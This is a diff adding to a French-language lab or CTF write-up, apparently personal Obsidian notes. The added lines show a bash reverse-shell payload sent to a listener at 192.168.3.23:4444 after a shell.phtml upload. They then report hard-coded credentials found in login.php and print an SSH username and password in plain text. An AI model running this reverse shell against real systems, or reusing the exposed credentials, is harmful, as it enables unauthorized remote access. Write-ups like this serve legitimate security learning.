@@ -152,3 +152,20 @@ shell.phtml
 
 ![[IMG-20260211202508913.png]]
 
+On utilise cette payload:
+```
+bash -c 'bash -i >& /dev/tcp/192.168.3.23/4444 0>&1'
+```
+
+![[IMG-20260211203743648.png]]
+
+Dans le fichier login.php on retrouve des creds hard codé:
+![[IMG-20260211205111046.png]]
+
+On trouve donc les creds ssh pour se connecter à la machine:
+```
+user:JunDRDZKHDnpkpDDvay
+```
+
+![[IMG-20260211205527276.png]]
+
